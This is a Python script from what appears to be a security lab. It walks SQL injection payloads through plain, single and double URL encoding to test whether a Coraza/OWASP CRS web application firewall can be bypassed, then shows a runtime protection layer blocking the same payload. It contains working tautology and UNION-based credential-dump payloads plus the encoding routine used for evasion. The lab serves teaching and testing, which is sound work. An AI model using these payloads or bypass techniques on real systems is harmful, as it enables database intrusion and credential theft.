#!/usr/bin/env python3
"""Cardinal — DOUBLE / ALTERNATE-ENCODING WAF evasion (reference sqli-reference.pdf
§3, row 1: "Alternate / mismatched encodings").

The idea: encode a payload so the WAF sees it STILL ENCODED (no keyword to match)
while the app decodes it back into the real attack.

Why a second decode is needed on THIS stack: Werkzeug already percent-decodes the
query string ONCE, so a double-encoded %2527 reaches the app as %27 — still inert.
The webapp's ?decode=double toggle applies ONE more unquote (%27 -> '), modelling
the very common double-decoding app/middleware and re-forming the payload the WAF
never saw. The toggle keeps the demo honest: without that extra decode the payload
is inert at the app too, so there would be no real bypass to show.

Ports (proxy/etc/caddy/Caddyfile):
  :80    enforcing WAF  (Coraza + OWASP CRS)  -> blocks
  :8080  detection-only -> logs to /shared/waf_audit.log, forwards

This walks a payload from plain -> single-encoded -> double-encoded and prints
what each actually did. It does NOT assume the outcome: whether CRS's own
double-encoding rule (the 920xxx "URL Encoding Abuse" family) catches step C/D is
an empirical result — read it off the walk and /shared/waf_audit.log.

Run on the attacker node:  /scripts/encoding_evasion.sh   (wraps this)
                     or:    python3 /scripts/encoding_evasion.py
"""
import json
import urllib.error
import urllib.parse
import urllib.request

HOST = "172.30.0.10"
ENFORCE = f"http://{HOST}"          # :80  — enforcing WAF
DETECT = f"http://{HOST}:8080"      # :8080 — detection only

BOOL = "' OR '1'='1"
UNION = "zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -"


def enc1(s):   # single URL-encode (every byte)
    return urllib.parse.quote(s, safe="")


def enc2(s):   # double URL-encode: re-encode the percent signs (%27 -> %2527)
    return enc1(s).replace("%", "%25")


def plain(s):  # minimal: only spaces encoded, so keywords/quotes stay literal
    return s.replace(" ", "%20")


def fetch(base, q_wire, extra=""):
    """GET /api/directory with q placed on the wire VERBATIM (urllib does not
    re-encode the query), so we control exactly how many decode layers it carries."""
    url = f"{base}/api/directory?impl=concat&q={q_wire}{extra}"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url), timeout=15)
        return r.getcode(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return None, f"(error: {e})"


def verdict(code, text, leak=None):
    if code == 403:
        who = "RASP" if "rasp" in text.lower() else "WAF"
        return f"BLOCKED by {who} (403)"
    if code != 200:
        return f"HTTP {code}"
    try:
        d = json.loads(text)
        n = d.get("count", len(d.get("results", [])))
    except Exception:
        return "passed (non-JSON)"
    if leak is not None:
        return f"INJECTED — creds LEAKED (rows={n})" if leak in text else f"passed, no leak (rows={n})"
    return f"INJECTED — all rows ({n})" if isinstance(n, int) and n > 1 else f"passed, inert (rows={n})"


def step(label, base, q_wire, extra="", leak=None):
    code, text = fetch(base, q_wire, extra)
    port = base.split(HOST)[-1] or ":80"
    print(f"  {label}")
    print(f"      wire q={q_wire[:70]}{'…' if len(q_wire) > 70 else ''}")
    print(f"      {port:6} -> {verdict(code, text, leak)}")


def main():
    print("=" * 74)
    print("BOOLEAN tautology   ' OR '1'='1   (concat path returns ALL rows if it fires)")
    print("=" * 74)
    step("A. plain            @ :80  (keyword in cleartext)", ENFORCE, plain(BOOL))
    step("B. single-encoded   @ :80  (WAF decodes once -> sees it)", ENFORCE, enc1(BOOL))
    step("C. double-encoded   @ :80, decode=single (app: 1 decode)", ENFORCE, enc2(BOOL), "&decode=single")
    step("D. double-encoded   @ :80, decode=double (app: 2 decodes)", ENFORCE, enc2(BOOL), "&decode=double")
    print("     Reading C/D: if D is INJECTED, the bypass worked — the WAF saw only")
    print("     %27.. (no keyword) and passed, and the app's 2nd decode re-formed the")
    print("     quote. If C/D are BLOCKED, CRS's double-encoding rule caught the %25 —")
    print("     note the rule id in /shared/waf_audit.log.")
    step("E. double-encoded   @ :8080 detection, decode=double", DETECT, enc2(BOOL), "&decode=double")

    print()
    print("=" * 74)
    print("UNION creds dump    (look for 'alicepw' in the response)")
    print("=" * 74)
    step("A. plain            @ :80", ENFORCE, plain(UNION), leak="alicepw")
    step("D. double-encoded   @ :80, decode=double", ENFORCE, enc2(UNION), "&decode=double", leak="alicepw")

    print()
    print("=" * 74)
    print("COMPOSITION — RASP catches the payload that beat the WAF")
    print("=" * 74)
    step("F. double-encoded   @ :80, decode=double, rasp=block", ENFORCE, enc2(BOOL), "&decode=double&rasp=block")
    print("     RASP inspects the FINAL, decoded query at the DB call (reference §2.4),")
    print("     so the encoding trick that blinds the WAF does not help against it.")

    print()
    print("[*] WAF verdicts (matched CRS rule ids): /shared/waf_audit.log")
    print("[*] RASP verdicts:                       /shared/rasp_audit.log")


if __name__ == "__main__":
    main()
